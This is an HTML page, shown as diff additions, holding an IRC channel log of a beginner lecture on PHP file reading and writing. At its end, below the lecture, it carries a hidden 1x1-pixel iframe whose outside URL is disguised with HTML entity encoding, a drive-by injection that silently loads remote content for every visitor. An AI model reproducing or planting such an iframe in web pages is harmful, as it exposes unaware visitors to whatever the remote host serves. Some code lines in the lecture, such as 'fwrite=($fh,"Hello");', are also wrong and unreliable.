+<br><b>&lt;Paya></b> finaly
+<br><b>&lt;AZTEK> to open files in php you use the fopen command</b>
+<br><b>&lt;AZTEK> so</b>
+<br><b>&lt;AZTEK> the syntax is</b>
+<br><b>&lt;Mikkkeee></b> finally
+<br><b>&lt;Paya></b> k
+<br><font color="#FF0000">*** _052_ has joined #bsrf</font>
+<br><b>&lt;AZTEK> $filehandle=fopen("filename","");</b>
+<br><b>&lt;AZTEK> sorry i had to get through the other stuff</b>
+<br><font color="#FF0000">*** voodoochild has joined #bsrf</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v voodoochild</font>
+<br><b>&lt;AZTEK> the variable $filehandle contans the memory address of
+the open file for easy access</b>
+<br><b>&lt;AZTEK> the filename is of course the filename</b>
+<br><b>&lt;AZTEK> where the double quotes are</b>
+<br><b>&lt;AZTEK> in their there should be one of the following</b>
+<br><b>&lt;AZTEK> 'r' - Open for reading only; place the file pointer at
+the beginning of the file.</b>
+<br><b>&lt;AZTEK> 'r+' - Open for reading and writing; place the file pointer
+at the beginning of the file.</b>
+<br><b>&lt;AZTEK> 'w' - Open for writing only; place the file pointer at
+the beginning of the file and truncate the file to zero length. If the
+file does not exist, attempt to create it.</b>
+<br><b>&lt;AZTEK> 'w+' - Open for reading and writing; place the file pointer
+at the beginning of the file and truncate the file to zero length. If the
+file does not exist, attempt to create it.</b>
+<br><b>&lt;AZTEK> 'a' - Open for writing only; place the file pointer at
+the end of the file. If the file does not exist, attempt to create it.</b>
+<br><b>&lt;AZTEK> 'a+' - Open for reading and writing; place the file pointer
+at the end of the file. If the file does not exist, attempt to create it.</b>
+<br><font color="#FF0000">*** Canticle has left #bsrf</font>
+<br><b>&lt;AZTEK> so example</b>
+<br><b>&lt;AZTEK> $fh=fopen("hello.txt","r");</b>
+<br><b>&lt;AZTEK> would open the file hello.txt for reading</b>
+<br><b>&lt;AZTEK> to get the data from that file you use the fread command</b>
+<br><b>&lt;AZTEK> the synatx for that is</b>
+<br><b>&lt;AZTEK> $store=fread($filehandle,lenght to read to);</b>
+<br><font color="#FF0000">*** vanished[homework] is now known as vanished</font>
+<br><b>&lt;vanished></b> back
+<br><b>&lt;AZTEK> the $store varible is the varible to store the read value
+in</b>
+<br><font color="#FF0000">*** wishmaster has quit IRC (Quit: )</font>
+<br><b>&lt;AZTEK> the file handle is what we defined when we opened the
+file</b>
+<br><b>&lt;AZTEK> now the length is special</b>
+<br><b>&lt;AZTEK> to read the entire file you would put</b>
+<br><b>&lt;AZTEK> filesize("hello.txt")</b>
+<br><b>&lt;AZTEK> you CAN NOT put the file handle or it wont work</b>
+<br><font color="#FF0000">* Mikkkeee says is everyone awake?</font>
+<br><b>&lt;AZTEK> so</b>
+<br><b>&lt;AZTEK> $hello=fread($fh, filesize("hello.txt"));</b>
+<br><b>&lt;AZTEK> reads the entire file hello.txt into the varible $hello</b>
+<br><b>&lt;AZTEK> now reading is no fun if we cant write to a file</b>
+<br><b>&lt;AZTEK> but first we have to close the file as to not take pressious
+ram memory</b>
+<br><b>&lt;AZTEK> so we use fclose</b>
+<br><b>&lt;AZTEK> the sytax is fclose($filehandle);</b>
+<br><b>&lt;AZTEK> simple</b>
+<br><font color="#FF0000">*** MANOWAR^ has quit IRC (Quit: Ping timeout)</font>
+<br><font color="#FF0000">*** Mikkkeee has left #bsrf</font>
+<br><font color="#FF0000">*** Mikkkeee has joined #bsrf</font>
+<br><font color="#FF0000">*** ChanServ sets mode: +o Mikkkeee</font>
+<br><font color="#FF0000">*** N0S01uti0n has joined #bsrf</font>
+<br><b>&lt;AZTEK> now that we have the old file closed we can open the
+same file for writing</b>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v N0S01uti0n</font>
+<br><b>&lt;AZTEK> so we</b>
+<br><b>&lt;N0S01uti0n></b> hey i need a short naritive about drugs/narcotics
+for my health class... anyone know where i can get one
+<br><b>&lt;N0S01uti0n></b> thanks mike
+<br><b>&lt;AZTEK> $fh=fopen("hello.txt","w");</b>
+<br><font color="#FF0000">*** DockAlfer has quit IRC (Quit: Good night.)</font>
+<br><font color="#FF0000">*** Paya sets mode: +v _medved-</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v _052_</font>
+<br><font color="#FF0000">*** BootError has quit IRC (Quit: BootError Bot
+6.0 Gamma (Shutdown code 3.2 Beta))</font>
+<br><b>&lt;AZTEK> then we use the fwrite command</b>
+<br><font color="#FF0000">*** G0lD has joined #bsrf</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v G0lD</font>
+<br><b>&lt;AZTEK> the syntax is fwrite($fh,string to write to file,optional
+value of the length to write);</b>
+<br><b>&lt;AZTEK> so</b>
+<br><b>&lt;AZTEK> fwrite=($fh,"Hello");</b>
+<br><font color="#FF0000">* Balle[away] 0,12 Away 0,1 Balle 15is not here
+11(0Im sleeping.. goddamit..11) (022:09:38 11)</font>
+<br><b>&lt;AZTEK> now some people can see how you could write the contents
+of an html form to a file</b>
+<br><b>&lt;G0lD></b> does someone in here understand run levels ?
+<br><b>&lt;HardW1r3></b> shhhhh lecture
+<br><b>&lt;AZTEK> now i am going to write a short followup tut with code
+example and i will cover more file i/o</b>
+<br><b>&lt;AZTEK> but after you are done writing make sure to close the
+file</b>
+<br><b>&lt;AZTEK> with fclose($fh);</b>
+<br><b>&lt;AZTEK> and that basicly condludes the php lecture</b>
+<br><b>&lt;AZTEK> any questions</b>
+<br><b>&lt;Mikkkeee></b> damn, i need the whole log
+<br><font color="#FF0000">*** Serial_Killer has quit IRC (Quit: ALL FOR
+ONE,ONE FOR ALL!!!!!!!)</font>
+<br><b>&lt;AZTEK> i will write the follow up in a few days</b>
+<br><b>&lt;Paya></b> I have it
+<br><b>&lt;AZTEK> i got one</b>
+<br><b>&lt;Mikkkeee></b> okay who will mail me the log
+<br><b>&lt;Mikkkeee></b> the complete one
+<br><font color="#FF0000">*** Mikkkeee sets mode: -m</font>
+<br><b>&lt;Mikkkeee></b> okay cut log here
+<p><b>&lt;--------------End of lecture------------></b>
+<br>&nbsp;
+<br>&nbsp;
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
